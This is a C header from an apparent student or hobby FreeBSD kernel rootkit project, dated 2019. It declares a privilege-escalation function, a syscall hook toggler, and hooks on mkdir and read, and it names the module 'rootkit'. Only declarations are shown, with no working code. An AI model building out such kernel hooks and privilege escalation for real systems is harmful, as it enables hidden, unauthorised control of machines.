/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>


void escalate_privledge(struct thread * td);
void toggle_hook(char * state, int sys_call_num, void*dest_func);
int mkdir_hook(struct thread *td, void *syscall_args);
int read_hook(struct thread *td, void * syscall_args);
#ifndef CONFIG_H
#define CONFIG_H

/* See debug.h for available log levels. */
#define LOG_LEVEL LOG_LEVEL_INFO
#define ON "on"
#define OFF "off"
#define MODULE_NAME "rootkit"


#endif /* CONFIG_H */
